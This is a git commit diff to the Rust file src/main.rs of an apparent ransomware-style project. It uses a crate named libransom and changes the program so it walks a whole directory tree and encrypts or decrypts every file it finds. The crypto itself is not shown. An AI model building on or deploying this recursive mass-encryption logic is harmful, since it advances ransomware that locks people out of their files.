82d135eb6dc8a9a85857a49a569a89af69b1ee94
RotrixX <ncusnir43@gmail.com>
2023-03-12 19:31:25 +0000

    feat: encrypt recursively directories inside root directory

--- src/main.rs
+++ src/main.rs
@@ -1,5 +1,6 @@
 use libransom::encrypt_or_decrypt;
 use std::{env, fs};
+use walkdir::WalkDir;
 
 fn main() {
     let args: Vec<_> = env::args().collect();
@@ -24,13 +25,12 @@ fn main() {
 
     // Check if the input is a file or a directory
     if fs::metadata(args[2].clone()).unwrap().is_dir() {
-        let entries = fs::read_dir(args[2].clone()).unwrap();
+        // let entries = fs::read_dir(args[2].clone()).unwrap();
 
-        // Iterate over files in directory and encrypt or decrypt them
-        for raw_entry in entries {
-            let entry = raw_entry.unwrap();
+        // Iterate over files and directories inside a directory and encrypt or decrypt them
+        for entry in WalkDir::new(args[2].clone()).into_iter().filter_map(|e| e.ok()) {
 
-            if entry.file_type().unwrap().is_file() {
+            if entry.file_type().is_file() {
                 encrypt_or_decrypt(entry.path().to_str().unwrap(), args[1].clone().as_str());
             }
         }
